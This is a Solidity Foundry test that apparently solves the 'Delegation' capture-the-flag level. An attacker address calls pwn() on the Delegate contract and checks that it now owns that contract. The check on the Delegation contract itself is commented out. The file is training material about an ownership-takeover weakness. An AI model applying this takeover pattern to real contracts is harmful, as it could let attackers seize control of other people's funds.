pragma solidity ^0.8.14;


import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/6_Delegation/Delegate.sol";
import "../../src/6_Delegation/Delegation.sol";

contract DelegateTest is Test {

    Delegate public victimDelegate;
    Delegation public vitimDelegation;
    address public owner;
    address public addr1;

    function setUp() public {

        owner = vm.addr(1);
        addr1 = vm.addr(2);

        vm.deal(addr1, 1 ether);

        vm.prank(owner);
        victimDelegate = new Delegate(owner);
        vitimDelegation = new Delegation(address(victimDelegate));
    }

    function testAttack() public {

        console.log(victimDelegate.owner());
        console.log(vitimDelegation.owner());

        vm.prank(addr1);
        (bool success, ) = address(victimDelegate).call(abi.encodeWithSignature("pwn()"));
        require(success);


         assertEq(victimDelegate.owner(), addr1);
        // assertEq(vitimDelegation.owner(), addr1);

    }

}